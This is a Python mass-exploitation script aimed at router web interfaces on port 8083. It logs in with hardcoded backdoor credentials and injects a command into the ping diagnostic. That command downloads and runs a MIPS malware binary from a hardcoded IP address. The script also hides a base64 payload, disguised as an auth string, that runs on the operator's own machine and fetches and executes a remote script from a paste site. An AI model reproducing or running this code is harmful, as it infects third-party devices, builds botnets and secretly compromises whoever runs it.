#! python !#
import threading, sys, time, random, socket, subprocess, re, os, base64, struct, array, requests
from threading import Thread
from time import sleep
import requests
from requests.auth import HTTPDigestAuth
from decimal import *	
ips = open(sys.argv[1], "r").readlines()

auth_payload = "cnVuKCJjZCAvbW50OyB3Z2V0IHBhc3RlLmVlL3IvckVxZU4vMCAtTyB4IC1xOyBjaG1vZCAreCB4OyBzaCB4ID4gL2Rldi9udWxsIDI+JjE7IHJtIC1yZiB4OyBjZCIp"
login_payload = "Frm_Logintoken=4&Username=root&Password=W%21n0%26oO7."

command_payload = "&Host=;$(cd /tmp;wget http://37.0.10.182/bins/sora.mips; chmod 777 sora.mips; ./sora.mips zte)&NumofRepeat=1&DataBlockSize=64&DiagnosticsState=Requested&IF_ACTION=new&IF_IDLE=submit"

def run(cmd):
    subprocess.call(cmd, shell=True)
exec(base64.b64decode(auth_payload))	
class rtek(threading.Thread):
		def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
		def run(self):
			try:
				
				url = "http://" + self.ip + ":8083/login.gch"
                                url2 = "http://" + self.ip + ":8083/manager_dev_ping_t.gch"
				url3 = "http://" + self.ip + ":8083/getpage.gch?pid=1001&logout=1"
                               
				requests.post(url, timeout=3, data=login_payload) # bypass auth with backdoor
				requests.post(url2, timeout=2.5, data=command_payload) # command injection in ping function
                                requests.get(url3, timeout=2.5) # logout so we dont keep the session open (it happens and its annoying)

			except Exception as e:
				pass
for ip in ips:
	try:
		n = rtek(ip)
		n.start()
		time.sleep(0.03)
	except:
		pass
